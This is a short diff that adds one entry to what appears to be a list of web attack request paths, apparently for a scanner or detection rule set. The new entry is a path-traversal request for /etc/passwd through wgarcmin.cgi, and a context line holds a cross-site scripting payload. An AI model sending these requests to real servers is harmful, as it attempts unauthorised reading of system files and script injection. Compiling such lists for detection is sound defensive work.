@@ -15,3 +15,4 @@
 /gsearch.php.en?prod=';prompt`document.domain`;//
 /apply_sec.cgi
 /wp-admin/admin-ajax.php?action=directorist_author_pagination
+/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd
